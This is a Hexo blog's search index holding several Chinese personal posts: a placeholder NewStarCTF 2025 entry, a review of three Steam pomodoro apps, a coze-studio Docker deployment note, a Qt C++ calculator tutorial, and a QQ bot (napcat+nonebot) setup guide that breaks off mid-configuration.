<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStarCTF_2025</title>
      <link href="/2025/09/29/NewStarCTF-2025/"/>
      <url>/2025/09/29/NewStarCTF-2025/</url>
      
        <content type="html"><![CDATA[<h1 id="标题文字"><a href="#标题文字" class="headerlink" title="标题文字"></a>标题文字</h1><p>啥都没写呢 留点东西后边方便交</p><h1 id="至公开赛道对应赛题停止提交后-48-小时为止，禁止任何自然人或组织在互联网上公开其解题思路或题解（WriteUp），违者将作禁赛处理，并视情况依法追究其责任。"><a href="#至公开赛道对应赛题停止提交后-48-小时为止，禁止任何自然人或组织在互联网上公开其解题思路或题解（WriteUp），违者将作禁赛处理，并视情况依法追究其责任。" class="headerlink" title="至公开赛道对应赛题停止提交后 48 小时为止，禁止任何自然人或组织在互联网上公开其解题思路或题解（WriteUp），违者将作禁赛处理，并视情况依法追究其责任。"></a><strong>至公开赛道对应赛题停止提交后 48 小时为止</strong>，禁止任何自然人或组织在互联网上公开其解题思路或题解（WriteUp），违者将作禁赛处理，并视情况依法追究其责任。</h1><p>Week1&amp;2的 Writeup将会在近期确认后放出 大约会是10月14日</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 编辑中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三款steam付费番茄钟软件测评</title>
      <link href="/2025/09/24/%E4%B8%89%E6%AC%BEsteam%E7%95%AA%E8%8C%84%E9%92%9F%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/"/>
      <url>/2025/09/24/%E4%B8%89%E6%AC%BEsteam%E7%95%AA%E8%8C%84%E9%92%9F%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<h2 id="三款steam付费番茄钟软件测评"><a href="#三款steam付费番茄钟软件测评" class="headerlink" title="三款steam付费番茄钟软件测评"></a>三款steam付费番茄钟软件测评</h2><p>当然 我先提前叠个甲</p><ul><li>纯属非专业主观评测 意为分享自己使用后的感想与推荐意图 如有不同意见请随意分享</li><li>不知道steam是啥的 这是<a href="https://store.steampowered.com/">正版官网</a> 剩下的麻烦自己去了解</li><li>以下软件基本都要收米 steam常有特惠 本人建议打折再买 奉行网络软件不花钱主义的请自行去找出路</li><li>该文章编辑于2025年&#x2F;10月 必定会在今后存在过时的内容 若有信息与游戏如今更新的版本不同 以游戏为准</li></ul><p>番茄钟 一种参照番茄工作法的计时器 简单来说就是将专注工作和休息时间穿插排列 达到增加效率 减少拖延 增强动力的效果<br>（举例来说就是 25分钟工作-5分钟短休息-25分钟工作-5分钟短休息-25分钟工作-30分钟长休 类似的时间安排）</p><p>以下是我购买并使用过的三款以此功能为核心的软件 共通性为音乐播放器与相对游戏化的页面&#x2F;功能</p><h3 id="1-gogh-虚拟形象与专注（国区售价45-史低33-75-数据来自steamDB）"><a href="#1-gogh-虚拟形象与专注（国区售价45-史低33-75-数据来自steamDB）" class="headerlink" title="1.gogh:虚拟形象与专注（国区售价45 史低33.75 数据来自steamDB）"></a>1.gogh:虚拟形象与专注（国区售价<strong>45</strong> 史低<strong>33.75</strong> 数据来自<a href="https://steamdb.info/app/3213850/">steamDB</a>）</h3><blockquote><p>gogh:虚拟形象与专注 是一个将虚拟形象制作、房间布置和宠物养成游戏相结合的游戏化专注工具。布置你理想的房间，享受Lofi音乐和环境音效，在可爱的虚拟形象和奇妙宠物的陪伴下让你的学习和工作变得更加有趣。</p></blockquote><p>该软件提供了高度自定义化的3d捏人系统 支持保存多个人物配装 甚至连角色所处的环境都能进行完全的自定义（从毛胚房到家居完备的客厅&#x2F;起居室） 其中大部分照片&#x2F;相框容器显示的都是默认图片 需要本地图片配置更改</p><p><img src="1.png" alt="1"></p><p style="text-align: center; color: grey;">人物编辑页面</p><p><img src="2.png" alt="2"><br><img src="4.png" alt="4"><br><img src="3.png" alt="3"></p><p style="text-align: center; color: grey;">实机演示</p><p>诚然 这样的系统能带来极大的自由性 可将虚拟空间调成令自己满意的状态很是费时 对于我这种没那么多心思仔细装扮的懒人来说 选个预设房间并调整贴图才是更好的选择 软件本身提供了已经放好家具的预设房间与一些什么都没有摆的空房间 剩下的都交给使用者自由发挥</p><p>再来说说重要的使用体验 首先 软件自带的曲目很多 支持在<strong>13个纯音乐专辑</strong>里切换 每个都有自己的风格 从<strong>lofi</strong>  <strong>钢琴乐</strong>到<strong>像素</strong> <strong>宇宙</strong>风格<br><img src="1.gif" alt="1"></p><p style="text-align: center; color: grey;">专辑切换/曲目演示</p><p>除开曲子作为背景音乐 软件内还有<strong>环境音</strong>（其实就是较常见的白噪音）可供选择<br><img src="5.png" alt="5"></p><p style="text-align: center; color: grey;">环境音展示</p><p>除开背景音乐 软件的核心功能——<strong>番茄钟 todolist 习惯日历 日记</strong> 都是点击即可唤出窗口 进行使用<br><img src="6.png" alt="6"></p><p style="text-align: center; color: grey;">番茄钟 todo 习惯日历</p><p><img src="7.png" alt="7"></p><p style="text-align: center; color: grey;">日历</p><p>该软件还有个作为核心的基础系统——养宠物（可关闭声音&#x2F;关闭模型） 其实存在感不高 基本可以忽略<br>会有个宠物随着你对箱庭环境的编辑（处于虚拟早上&#x2F;夜晚 ）&#x2F;主要使用了哪个功能（番茄钟 todo 习惯）变化外形 隔一段周期生长成完全体 然后离开（留下一封因为翻译拉跨导致意义不明的信封） 随后再降临成为蛋 继续重新发育<br><img src="8.png" alt="8"></p><p style="text-align: center; color: grey;">宠物幼体</p><p>该软件是以手机版起家的 因此steam版还在更新 据说后期会有将虚拟人物匹配在一个房间中 进行联机专注的功能 拭目以待了</p><h3 id="2-Spirit-City-Lofi-Sessions（国区售价40-史低24-存在付费DLC-这些一会另讲-数据来自steamDB）"><a href="#2-Spirit-City-Lofi-Sessions（国区售价40-史低24-存在付费DLC-这些一会另讲-数据来自steamDB）" class="headerlink" title="2.Spirit City:Lofi Sessions（国区售价40 史低24 存在付费DLC 这些一会另讲 数据来自steamDB）"></a>2.Spirit City:Lofi Sessions（国区售价<strong>40</strong> 史低<strong>24</strong> 存在<strong>付费DLC</strong> 这些一会另讲 数据来自<a href="https://steamdb.info/app/2113850/">steamDB</a>）</h3><blockquote><p>Spirit City:Lofi Sessions 是一款游戏化的专注工具，配以舒缓的 Lofi 音乐。在这里，你可以发现和收集各种幻灵，自定义虚拟的休闲空间，并通过一系列简单好用的功能来提高注意力和缓解压力，为完成现实生活中的任务提供帮助。</p></blockquote><p>同样是展示了3d的虚拟化内容 该软件则走上了截然不同的赛道 房间中的大部分家具已经固定 只能进行配色&#x2F;材质的更换 更好上手<br><img src="9.png" alt="9"><br><img src="10.png" alt="10"></p><p style="text-align: center; color: grey;">房间编辑展示</p><p>人物模型这块比较偏欧美风 脸型估计是我看多日式动漫风了 不是很习惯..<br><img src="11.png" alt="11"><br><img src="12.png" alt="12"></p><p style="text-align: center; color: grey;">换装页面展示（是的这游戏还和among us有过联动）</p><p>该软件也是该有的功能都有 但番茄钟ui更酷一点<br><img src="13.png" alt="13"><br><img src="5.gif" alt="5"></p><p style="text-align: center; color: grey;">番茄钟 todo 习惯页面</p><p> <img src="14.png" alt="14"></p><p style="text-align: center; color: grey;">日记页面</p><p>环境自定义这块相对更丰富 可以选择四个时间段&#x2F;令你的人物在各种不同的地方进行活动<br><img src="15.png" alt="15"></p><p style="text-align: center; color: grey;">活动选择页面</p><p><img src="16.png" alt="16"></p><p style="text-align: center; color: grey;">时间段选择</p><p>然后是宠物功能 有多种不同的宠物 可以通过在游戏中进行不同的活动&#x2F;达成条件后挂机指定时间解锁<br>宠物会在你执行不同活动时 做不同的事情 按鼠标还能互动 很可爱<br><img src="3.gif" alt="3"> <img src="4.gif" alt="4"></p><p style="text-align: center; color: grey;">我其实只中意猫猫和小幽灵 其他都不怎么戳我萌点</p><p>在音乐方面 该软件提供了大量的音乐 数量多的恐怖 还能收藏起来慢慢欣赏 点个赞<br><img src="17.png" alt="17"></p><p>顺带一提 该软件存在两个影响内容的付费dlc <strong>火车dlc</strong>与<strong>厨房dlc</strong> 价格都在30元左右 厨房的我没买 就来说说火车dlc的使用体验<br>DLC购买后会在左侧菜单栏新增地点更换功能 能够切换所在的场地</p><p><img src="18.png" alt="18"></p><p>该dlc提供了能在列车外&#x2F;内进行的一套人物动作 以及dlc专属的宠物（本人还没解锁 不了解）</p><p><img src="6.gif" alt="6"></p><p style="text-align: center; color: grey;">能够切换列车所在地点/速度/颠簸程度</p><p>配置完毕后可以在科幻&#x2F;木制的车厢中观赏窗外的星空 很有感觉</p><h3 id="3-Chill-Pulse-心流小筑（国区售价22-史低16-28-数据来自steamDB）"><a href="#3-Chill-Pulse-心流小筑（国区售价22-史低16-28-数据来自steamDB）" class="headerlink" title="3.Chill Pulse 心流小筑（国区售价22 史低16.28 数据来自steamDB）"></a>3.Chill Pulse 心流小筑（国区售价<strong>22</strong> 史低<strong>16.28</strong> 数据来自<a href="https://steamdb.info/app/2826180/">steamDB</a>）</h3><blockquote><p>Chill Pulse心流小筑将生产力工具与宁静环境相结合。运用番茄钟和待办事项清单提升专注力，同时，从赛博朋克城市到古老风景的背景音乐增添放松氛围。</p></blockquote><p>随后的这个是国人作品 展示了2d环境下的虚拟化内容<br><img src="19.png" alt="19"><br><img src="21.png" alt="21"></p><p style="text-align: center; color: grey;">软件页面</p><p>初始的场景为<strong>里昂,法国</strong> 而后面的场景需要通过使用番茄钟功能获取代币来解锁 也能用来购买一些服装&#x2F;头饰&#x2F;切换宠物 进入新场景时 左下角的音乐播放器会自动添入背景相对应的bgm 游戏将自带的音乐分为了八个大类 也可以修改文件来自定义音乐<br><img src="7.gif" alt="7"><br><img src="20.png" alt="20"><br>获取代币还有两种作为添头的方式 <strong>养鱼</strong>和<strong>调酒</strong><br>养鱼玩法类似pvz的僵尸鱼缸 在左边用代币购买鱼苗 鱼缸里边按右键投喂鱼饵 鱼在投喂定量鱼饵后会成长 可选择直接出售或是留着让其产代币<br><img src="8.gif" alt="8"></p><p style="text-align: center; color: grey;">这么多饵真不会撑死吗</p><p>调酒点击画面右方的箭头可开启页面 根据各个场景选择任意三份的三种原料 组成一份赛博饮料 可以提供暂时的经验&#x2F;代币获取加成（类似经验卡的功能） 不同材料组合所得出的生效时间 经验&#x2F;代币增加百分比也是不同的 可以随意尝试<br><img src="9.gif" alt="9"></p><p>接下来还有实时匿名聊天室 与信件功能（类似qq漂流瓶 可选择投递 或 阅读&#x2F;回复）<br><img src="22.png" alt="22"><br><img src="23.png" alt="23"></p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><ul><li>最好动下画质相关设置 不然占用这块会有些吓人…</li></ul><hr><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 测评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夏令营-ai</title>
      <link href="/2025/09/22/%E5%A4%8F%E4%BB%A4%E8%90%A5-ai/"/>
      <url>/2025/09/22/%E5%A4%8F%E4%BB%A4%E8%90%A5-ai/</url>
      
        <content type="html"><![CDATA[<h1 id="暑假搞了个ai-云原生夏令营-记录一下配置过程"><a href="#暑假搞了个ai-云原生夏令营-记录一下配置过程" class="headerlink" title="暑假搞了个ai&#x2F;云原生夏令营 记录一下配置过程"></a>暑假搞了个ai&#x2F;云原生夏令营 记录一下配置过程</h1><p>写一下自己配置整个coze-studio的过程</p><p>由于老师上课讲到了coze 再加上加分项中提到了“使用Docker在本地部署智能体应用”<br>于是我在github上找到了该平台的一站式 AI Agent 开发工具coze-studio 并在虚拟机的linux环境中进行了部署</p><p>整个部署的过程较为简易</p><p>安装docker → 配置yaml与env → 进行compose  → 配置prompt与知识库<br>（提到deepseek可以调整参数）</p><p><a href="https://github.com/coze-dev/coze-studio">coze-studio</a><br>按github中的手册进行docker中的配置-随后打开本地网页 进行配置和对话即可 相对来说挺方便的</p><p>接下来附上些图片吧 毕竟的确是没啥好特别讲的…</p><p><img src="1.jpg" alt="1"><br><img src="2.jpg" alt="2"><br><img src="3.jpg" alt="3"><br><img src="4.jpg" alt="4"></p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2025/09/17/hello-world/"/>
      <url>/2025/09/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>网站正在重建中…<br>目前有不少东西要搞 所以还是个半成品<br>嘛 先这样了<br>唔 一会就睡了 在这之前感谢一下能让我恢复的主要帮手吧 算了 明天再说</p><h3 id="加更"><a href="#加更" class="headerlink" title="加更"></a>加更</h3><p>前因是电脑被勒索病毒给干倒了 hexo这个博客所依赖的也是本地文件到github的配置 因此理论来说大部分数据都难以恢复了<br>翻了一遍hexo的issue 看到同类问题相对较少 倒是有人搞了个将部署后的html转为md的脚本<br><a href="https://github.com/owofile/Hexo-Phantom-Res">脚本源地址</a><br>经过ai自行修改 加上一些个人调整 最后把所有老文章+图片修复了 也算是变相复原了吧<br>总之很感谢脚本的原作者啦 没了这个确实会很难办 就这样了</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>qt环境下的c++程序编写</title>
      <link href="/2025/02/27/cpp/"/>
      <url>/2025/02/27/cpp/</url>
      
        <content type="html"><![CDATA[<p>课程讲到了面向对象程序设计(C++)<br>那就根据课程写一些笔记</p><h2 id="C-与C"><a href="#C-与C" class="headerlink" title="C++与C"></a>C++与C</h2><p><strong>C++是在C的基础上扩展了面向对象的内容,所以C++完全兼容C</strong></p><p>大学中使用的开发环境是<strong>qt</strong> 非常好用 能很方便的做出一些带ui的程序 这里会自学 并赛一些比较基础的实例上来</p><h2 id="一、基础四则计算器"><a href="#一、基础四则计算器" class="headerlink" title="一、基础四则计算器"></a>一、基础四则计算器</h2><h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><p><strong>先新建一个项目 文件-新建文件或项目-选择一个模板-Application-Qt Widgets Application-右下角确认选择</strong><br>随后选择项目名称 具体目录 配置好编译文件 就可以开始编写了<br><img src="1.jpg" alt="1"><br>可以看到系统会默认给我们添加main.cpp、文件名.cpp、 文件名.h和一个.pro项目文件，点击完成，即可创建出一个Qt桌面程序。</p><p>关于这些文件的具体作用我们先按下不表 来看看如何一步步打造自己的计算器吧</p><h3 id="设计计算器ui"><a href="#设计计算器ui" class="headerlink" title="设计计算器ui"></a>设计计算器ui</h3><p>每个计算器程序都会有自己的ui（用户页面）——例如我接下来展示的 微软自带的计算器<br><img src="2.jpg" alt="2"><br>在编写具体的代码之前 我们需要参考类似的布局 设计出差不多的页面<br><img src="3.jpg" alt="3"><br><strong>↑程序的最终效果图</strong><br>双击左边项目栏中的ui文件 进入<strong>ui编辑</strong>的页面 可以看到左半边是各种常见的组件 比如按钮 文本框 勾选框之类的 只要在左边选择想要的组件 选中并拖拽到屏幕中央 便可以在你设计的程序里添加相应的内容<br>首先是 <strong>按钮</strong> 既然是计算器 那就肯定要有按钮<br>从左边拖出一个 <strong>push button</strong> 双击更改其上显示的文字 然后在右下角minimumsize和maximumsize处将按钮大小固定为40×40 再次选中该按钮 用 <strong>ctrl+c ctrl+v</strong> 来复制出一样的按钮 其中等于号可以进行微调 设置成90×40的大小<br><img src="4.jpg" alt="4"><br>排列好大致的位置后 将所有按钮选中 点击上方的 <strong>栅格布局</strong> 按钮 就可以将这些按钮组合起来 调整位置更加方便<br><img src="5.jpg" alt="5"><br>整个计算器上边的文字框名为组件 <strong>Line edit</strong> 导入方法同理<br>接下来为了方便代码的编写 我们要为每个按钮起一个对应的对象名 点击按钮后在右上角会自动显示 双击来改名<br><img src="6.jpg" alt="6"><br>整个窗口的大小可以通过代码或者点击整个ui页面的背景 和调整按钮一样调整最大和最小尺寸<br>剩下有一部分可选的调整需要在cpp文件中定义<br><img src="8.jpg" alt="8"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MainWindow::MainWindow(QWidget \*parent)</span><br><span class="line">: QMainWindow(parent)</span><br><span class="line">, ui(new Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">ui-&gt;setupUi(this);</span><br><span class="line">this-&gt;setMaximumSize(220,340); //窗口最大尺寸</span><br><span class="line">this-&gt;setMinimumSize(220,340); //窗口最小尺寸</span><br><span class="line">this-&gt;setWindowTitle(&quot;计算器&quot;); //决定窗口标题</span><br><span class="line">QFont f(&quot;微软雅黑&quot;,14); //设置字体与字号</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setFont(f); //套用字体</span><br><span class="line">ui-&gt;EqualButton-&gt;setStyleSheet(&quot;background:pink&quot;); //设置等于号背景为粉色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>页面已经设计完毕了 接下来我们需要一个程序来让每个按钮实现他应有的功能<br>首先 为了让每个按钮被点击时加入对应的字符 我们需要一个能够盛放对应字符的变量<br>回到编辑页面 在.h头文件里定义一个QString变量 expression 用它来记录整个过程<br><img src="7.jpg" alt="7"><br>接下来 为了让每个按钮实现对应功能 再次回到设计页面 对相应的按钮右键单击-转到槽- 在跳出的窗口里点击clicked()-ok<br>会自动跳转到相应函数的定义中 编写一段对应代码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void MainWindow::on\_TwoButton\_clicked() //可能会根据程序和对象名有所不同</span><br><span class="line">&#123;</span><br><span class="line">expression += &quot;[对应字符]&quot;; //在expression中插入对应的字符</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(expression); //让文本框中显示expression中的字符</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依葫芦画瓢 把所有对应的按钮进行编写 <strong>清空 退格 等于</strong> 按钮则需要特殊的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">//清空</span><br><span class="line">void MainWindow::on\_Clear\_clicked()</span><br><span class="line">&#123;</span><br><span class="line">expression.clear();</span><br><span class="line">ui-&gt;MainLineEdit-&gt;clear();</span><br><span class="line">&#125;</span><br><span class="line">//退格</span><br><span class="line">void MainWindow::on\_Backspace\_clicked()</span><br><span class="line">&#123;</span><br><span class="line">expression.chop(1);</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(expression);</span><br><span class="line">&#125;</span><br><span class="line">//等于</span><br><span class="line">void MainWindow::on\_EqualButton\_clicked() &#123;</span><br><span class="line">if (expression.isEmpty()) &#123;</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">QStack&lt;double&gt; s\_num; // 改为double以支持浮点</span><br><span class="line">QStack&lt;char&gt; s\_opt;</span><br><span class="line">QByteArray ba = expression.toUtf8();</span><br><span class="line">const char \*opt = ba.constData();</span><br><span class="line">int i = 0;</span><br><span class="line">double tmp = 0;</span><br><span class="line">bool isNum = false;</span><br><span class="line">while (opt[i] != &#x27;\0&#x27; || !s\_opt.empty()) &#123;</span><br><span class="line">if (isdigit(opt[i])) &#123;</span><br><span class="line">tmp = tmp \* 10 + (opt[i] - &#x27;0&#x27;);</span><br><span class="line">i++;</span><br><span class="line">isNum = true;</span><br><span class="line">&#125; else if (opt[i] == &#x27;.&#x27; &amp;&amp; isNum) &#123;</span><br><span class="line">// 处理小数部分（需扩展逻辑）</span><br><span class="line">i++;</span><br><span class="line">double fraction = 0.1;</span><br><span class="line">while (isdigit(opt[i])) &#123;</span><br><span class="line">tmp += (opt[i] - &#x27;0&#x27;) \* fraction;</span><br><span class="line">fraction \*= 0.1;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if (isNum) &#123;</span><br><span class="line">s\_num.push(tmp);</span><br><span class="line">tmp = 0;</span><br><span class="line">isNum = false;</span><br><span class="line">&#125;</span><br><span class="line">// 运算符处理逻辑</span><br><span class="line">if (s\_opt.empty() || Priority(opt[i]) &gt; Priority(s\_opt.top()) ||</span><br><span class="line">(s\_opt.top() == &#x27;(&#x27; &amp;&amp; opt[i] != &#x27;)&#x27;)) &#123;</span><br><span class="line">if (opt[i] != &#x27;\0&#x27;) &#123;</span><br><span class="line">s\_opt.push(opt[i]);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">while (!s\_opt.empty() &amp;&amp;</span><br><span class="line">(Priority(opt[i]) &lt;= Priority(s\_opt.top()) || opt[i] == &#x27;)&#x27;)) &#123;</span><br><span class="line">char ch = s\_opt.pop();</span><br><span class="line">if (ch == &#x27;(&#x27; &amp;&amp; opt[i] == &#x27;)&#x27;) &#123;</span><br><span class="line">i++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if (s\_num.size() &lt; 2) &#123;</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">double num2 = s\_num.pop();</span><br><span class="line">double num1 = s\_num.pop();</span><br><span class="line">switch (ch) &#123;</span><br><span class="line">case &#x27;+&#x27;: s\_num.push(num1 + num2); break;</span><br><span class="line">case &#x27;-&#x27;: s\_num.push(num1 - num2); break;</span><br><span class="line">case &#x27;\*&#x27;: s\_num.push(num1 \* num2); break;</span><br><span class="line">case &#x27;/&#x27;:</span><br><span class="line">if (num2 == 0) &#123;</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(&quot;Error: Div 0&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">s\_num.push(num1 / num2);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isNum) s\_num.push(tmp); // 处理最后一个数字</span><br><span class="line">if (s\_num.empty()) &#123;</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ui-&gt;MainLineEdit-&gt;setText(QString::number(s\_num.top()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int MainWindow::Priority(char ch) &#123;</span><br><span class="line">switch(ch) &#123;</span><br><span class="line">case &#x27;(&#x27;:</span><br><span class="line">return 3;</span><br><span class="line">case &#x27;\*&#x27;:</span><br><span class="line">case &#x27;/&#x27;:</span><br><span class="line">return 2;</span><br><span class="line">case &#x27;+&#x27;:</span><br><span class="line">case &#x27;-&#x27;:</span><br><span class="line">return 1;</span><br><span class="line">default:</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都设置完之后点击左下角的编译 就可以测试成功运行了</p><p>注:cmd环境下不会显示UTF-8 需要在main函数中预先输入system(“chcp 65001”);</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> c语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新新的年</title>
      <link href="/2025/01/03/%E6%96%B0%E6%96%B0%E7%9A%84%E5%B9%B4/"/>
      <url>/2025/01/03/%E6%96%B0%E6%96%B0%E7%9A%84%E5%B9%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>新年到了 第一学期结束了 <del>高数也挂了</del><br>还有很多没做的事呢 先继续冲刺了</p>]]></content>
      
      
      <categories>
          
          <category> 告示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 告示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq机器人配置二三事</title>
      <link href="/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/"/>
      <url>/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<p>看别人整的qq机器人挺有意思 所以自已搭一个玩玩<br>使用了napcat+nonebot的方式</p><p>记录基础安装&#x2F;配置&#x2F;踩坑过程 配件安装之后有事也会写在这里</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>服务器是2核2G 一年份的阿里云服务器 用了学生优惠<br>一开始用的系统镜像是阿里云的Alibaba Cloud Linux 结果有些配置和官方的冲突了 遂作罢 改用Ubuntu</p><p>napcat和nonebot的安装没什么好说的 按照帮助文件运行命令即可<br>python有些全局安装由于安全考虑会不让你装 复制并输入回显中的强制安装选项即可</p><p>整个流程总结来说:<br>创建nonebot-启动napcat-在napcat上登陆想要实现机器人功能的qq-运行nonebot-ws反代配置成功-nonebot连接上napcat-nonebot开始监听napcat传输到的消息-nonebot根据自己的插件&#x2F;配置做出反应-成功</p><p>创建nonebot时注意是空格选择 enter确认 最好安装自带的<strong>echo</strong>功能 方便测试</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>要让这俩真正联动起效的话 得在napcat中设置反向ws<br>配置有两种方式:<br>1.留意启动日志里的形如 <code>[WebUi] WebUi Local Panel Url: http://127.0.0.1:6099/webui?token=xxxx</code> 的token信息<br>随后访问该网址（注意环境是否开放公网并自主修改ip）进入图形化页面<br>直接复制整个网址应该会自动传参 不用输入token<br>如果因为各种原因错过了token 可以在<code>webui.json</code>里找到 输入即可<img src="2.jpg" alt="2"><br>网络配置-右上角添加配置<br><img src="3.jpg" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">名称-不和别的重复就行 随意</span><br><span class="line">类型-选最后一个 WebSocket客户端/</span><br><span class="line">启用打开</span><br><span 